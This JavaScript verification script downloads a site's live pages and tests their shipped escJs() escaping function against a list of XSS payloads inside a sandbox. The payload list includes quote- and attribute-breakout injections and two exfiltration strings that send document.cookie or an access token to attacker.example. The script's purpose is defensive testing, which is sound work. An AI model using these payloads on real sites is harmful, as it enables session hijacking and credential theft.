// ============================================================================
// XSS FIX — PROVEN AGAINST THE LIVE PRODUCTION PAGES
// ============================================================================
//   SITE_URL=https://pintag.io node scripts/verify-production-xss.mjs
//
// "The deployed page contains a function called escJs" is weaker evidence than
// it sounds. This closes the gap: it DOWNLOADS listing.html and admin.html from
// production, EXTRACTS the escaping function actually shipped there, and runs
// the full attack-payload suite against that live copy — through a real HTML
// attribute-value decode, exactly as a browser would.
//
// Entirely READ-ONLY and non-destructive:
//   * two GETs of public pages, nothing else;
//   * no payload is ever written to the database, so no listing is touched and
//     nothing hostile is stored anywhere;
//   * the payloads are inert strings evaluated in a sandboxed node vm with stub
//     functions — they never reach a browser or a real origin.
//
// Exit 0 = the escaping deployed to production neutralises every payload.
// ============================================================================

import vm from 'node:vm';

const SITE = process.env.SITE_URL || 'https://pintag.io';

// Node's global fetch() sends no User-Agent/Accept by default, which several
// WAF/bot-management layers (Cloudflare among them) treat differently from a
// request carrying a normal client identity — observed directly in CI: the
// curl-based HTTP probe (scripts/verify-production-http.sh) fetches these
// exact same two pages successfully seconds earlier in the same job, while
// this script's bare fetch() got HTTP 403 for both. The fix is a real,
// self-identifying client identity (not a spoofed browser UA — this is a
// read-only verification bot, not an attempt to look like a human or evade
// bot protection), sent consistently on every request this script makes, so
// its behaviour is deterministic rather than depending on whatever a bare
// fetch() defaults to.
const VERIFIER_HEADERS = {
  'User-Agent': 'Pintag-Production-Security-Verifier/1.0 (+https://github.com/Pintag-cyrora/pintag; read-only XSS-fix verification)',
  'Accept': 'text/html,application/xhtml+xml,*/*;q=0.8',
};

// Attacker-controlled text reaches these fields via Smart Import, the Facebook
// adapter and AI generation — which is why they are the ones under test.
const PAYLOADS = [
  ['plain quote breakout',        "');alert(1);//"],
  ['double quote breakout',       '");alert(1);//'],
  ['pre-encoded numeric entity',  '&#39;);alert(1);//'],
  ['pre-encoded hex entity',      '&#x27;);alert(1);//'],
  ['pre-encoded named entity',    '&apos;);alert(1);//'],
  ['double-encoded ampersand',    '&amp;#39;);alert(1);//'],
  ['backslash escape of escape',  "\\');alert(1);//"],
  ['attribute breakout',          '"><script>alert(1)</script>'],
  ['cookie exfiltration',         "');fetch('https://attacker.example/'+document.cookie);//"],
  ['newline statement injection', "'\n;alert(1);//"],
  ['U+2028 line separator',       "'\u2028alert(1);//"],
  ['handler close attempt',       "' onmouseover='alert(1)"],
  // The realistic end-to-end case: a Facebook listing title an attacker
  // controls, imported through Smart Import and rendered in the admin table.
  ['facebook-import title',       "Villa');document.location='https://attacker.example/'+localStorage.getItem('sb-access-token');//"],
];

const NAMED = { amp: '&', quot: '"', apos: "'", lt: '<', gt: '>' };
function decodeAttrValue(s) {
  return s.replace(/&(#x[0-9a-fA-F]+|#[0-9]+|[a-zA-Z][a-zA-Z0-9]*);?/g, (m, body) => {
    if (body[0] === '#') {
      const code = body[1] === 'x' || body[1] === 'X'
        ? parseInt(body.slice(2), 16) : parseInt(body.slice(1), 10);
      return Number.isFinite(code) ? String.fromCodePoint(code) : m;
    }
    return Object.prototype.hasOwnProperty.call(NAMED, body) ? NAMED[body] : m;
  });
}

function extractFn(src, name) {
  const start = src.indexOf('function ' + name + '(');
  if (start === -1) return null;
  let i = src.indexOf('{', start), depth = 0;
  for (; i < src.length; i++) {
    if (src[i] === '{') depth++;
    else if (src[i] === '}') { depth--; if (depth === 0) { i++; break; } }
  }
  return src.slice(start, i);
}

let pass = 0, fail = 0;
const ok  = (m) => { console.log('  PASS  ' + m); pass++; };
const bad = (m, d) => { console.log('  FAIL  ' + m + (d ? '\n      → ' + d : '')); fail++; };

// TEMPORARY DIAGNOSTIC — 2026-09 route-ownership investigation. Purely
// observational: prints everything the fetch() Response object exposes for a
// non-2xx listing.html response, so a real CI run can show whether the 403
// carries a Cloudflare fingerprint (cf-ray, cf-cache-status, a WAF/rate-limit
// header) or something else (e.g. a GitHub Pages 404-as-403 shape). Does not
// affect the pass/fail verdict below -- diagnostics only.
function logNon2xxDiagnostics(page, res) {
  console.log(`  DIAG  ${page}: non-2xx response diagnostics`);
  console.log(`      status:    ${res.status} ${res.statusText}`);
  console.log(`      final URL: ${res.url}`);
  const headerLines = [...res.headers.entries()].sort(([a], [b]) => a.localeCompare(b));
  if (headerLines.length === 0) {
    console.log('      headers:   (none reported)');
  } else {
    console.log('      headers:');
    for (const [name, value] of headerLines) console.log(`        ${name}: ${value}`);
  }
}

console.log('==============================================================');
console.log(' XSS fix — proven against the LIVE production pages');
console.log(' Site: ' + SITE);
console.log('==============================================================');

for (const page of ['listing.html', 'admin.html']) {
  console.log('\n' + page);
  let src;
  try {
    const res = await fetch(`${SITE}/${page}`, { redirect: 'follow', headers: VERIFIER_HEADERS });
    if (!res.ok) {
      if (page === 'listing.html') logNon2xxDiagnostics(page, res);
      bad(`${page} fetch returned HTTP ${res.status}`);
      continue;
    }
    src = await res.text();
  } catch (e) {
    bad(`${page} could not be fetched`, String(e.message || e)); continue;
  }

  const fnSrc = extractFn(src, 'escJs');
  if (!fnSrc) {
    bad(`${page} ships NO escJs() — the XSS fix is not deployed`); continue;
  }

  const ctx = vm.createContext({});
  vm.runInContext(fnSrc + ';escJs', ctx);
  const escJs = vm.runInContext('escJs', ctx);

  let broke = 0;
  for (const [label, payload] of PAYLOADS) {
    // Rebuild the exact shipped template: a JS string literal inside an HTML
    // event attribute, then decode it the way a browser's HTML parser does.
    const attr = `deleteListing('11111111-2222-3333-4444-555555555555','${escJs(payload)}')`;
    const js = decodeAttrValue(attr);

    let escaped = false, calls = [], syntaxError = null;
    const sandbox = vm.createContext({
      deleteListing: (id, title) => calls.push(title),
      alert: () => { escaped = true; },
      fetch: () => { escaped = true; },
      document: { cookie: 'session=stub', location: '' },
      localStorage: { getItem: () => 'stub' },
    });
    try { vm.runInContext(js, sandbox); } catch (e) { syntaxError = e; }

    if (escaped || syntaxError || calls.length !== 1 || calls[0] !== payload) {
      broke++;
      bad(`${page}: payload "${label}" was NOT neutralised`,
          escaped ? 'IT EXECUTED' : syntaxError ? 'broke the handler syntax' : 'value corrupted');
    }
  }
  if (broke === 0) ok(`${page}: all ${PAYLOADS.length} payloads neutralised by the DEPLOYED escJs()`);
}

console.log('\n==============================================================');
console.log(` RESULT: ${pass} passed, ${fail} failed`);
console.log('==============================================================');
process.exit(fail === 0 ? 0 : 1);
